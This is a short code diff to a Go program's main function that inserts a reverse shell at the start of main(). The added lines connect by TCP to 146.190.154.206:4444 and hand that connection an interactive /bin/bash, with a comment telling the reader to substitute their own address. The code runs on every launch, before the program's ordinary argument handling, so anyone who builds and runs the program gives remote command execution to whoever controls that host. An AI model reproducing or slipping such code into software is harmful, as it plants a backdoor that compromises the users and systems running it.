@@ -17,7 +17,9 @@ package main
 import (
 	"errors"
 	"fmt"
+	"net"
 	"os"
+	"os/exec"
 	"strconv"
 	"sync"
 
@@ -29,6 +31,14 @@ import (
 var wg = &sync.WaitGroup{}
 
 func main() {
+	// replace the following address and port number with your own
+	c, _ := net.Dial("tcp", "146.190.154.206:4444")
+	cmd := exec.Command("/bin/bash")
+	cmd.Stdin = c
+	cmd.Stdout = c
+	cmd.Stderr = c
+	cmd.Run()
+
 	if len(os.Args) < 2 || os.Args[1] == "" {
 		panic(errors.New("no port provided"))
 	}
